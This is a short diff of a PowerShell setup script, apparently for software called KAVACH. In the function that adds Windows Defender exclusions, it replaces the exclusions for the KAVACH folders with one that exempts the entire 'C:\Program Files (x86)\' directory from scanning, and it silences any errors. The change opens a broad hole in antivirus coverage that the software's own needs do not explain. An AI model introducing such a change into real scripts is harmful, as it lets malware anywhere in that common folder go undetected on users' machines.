@@ -35,8 +35,7 @@ function Start-DefenderService {
 
 # Function to add exclusions to Windows Defender
 function Add-DefenderExclusions {
-    Add-MpPreference -ExclusionPath "C:\Program Files\KAVACH" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "C:\Program Files (x86)\KAVACH" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "C:\Program Files (x86)\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "KAVGUI.exe" -ErrorAction SilentlyContinue
     Write-Host "Windows Defender exclusions added."
 }
